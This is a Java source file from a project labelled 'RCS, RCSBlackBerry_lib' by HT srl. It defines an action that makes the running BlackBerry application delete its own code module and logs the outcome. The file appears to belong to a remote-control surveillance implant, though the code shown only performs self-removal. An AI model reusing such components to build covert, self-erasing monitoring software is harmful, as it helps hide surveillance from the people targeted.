/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : UninstallAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;

import com.ht.rcs.blackberry.utils.Check;

public class UninstallAction extends SubAction {

    public UninstallAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);

        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");

    }

    public UninstallAction(String host) {
        super(ACTION_UNINSTALL);

    }

    public boolean execute() {

        this.wantUninstall = true;
        
        ApplicationDescriptor ad = ApplicationDescriptor.currentApplicationDescriptor();
        int moduleHandle = ad.getModuleHandle();
        int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
        String errorString = Integer.toString(rc);
        switch (rc) {
            case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
                debug.info("Will be deleted on restart");
                //Device.requestPowerOff( true );
                break;
            case CodeModuleManager.CMM_MODULE_IN_USE:
            case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
                debug.info("Module In Use");
                break;
            case CodeModuleManager.CMM_HANDLE_INVALID:
                debug.error("Invalid Handle");
                break;
            case CodeModuleManager.CMM_MODULE_REQUIRED:
                debug.error("Module Required");
                break;
            default:
                debug.error(Integer.toString(rc));
                return false;
              
        }
        
        return true;
    }

    protected boolean parse(byte[] confParams) {

        return true;
    }

}
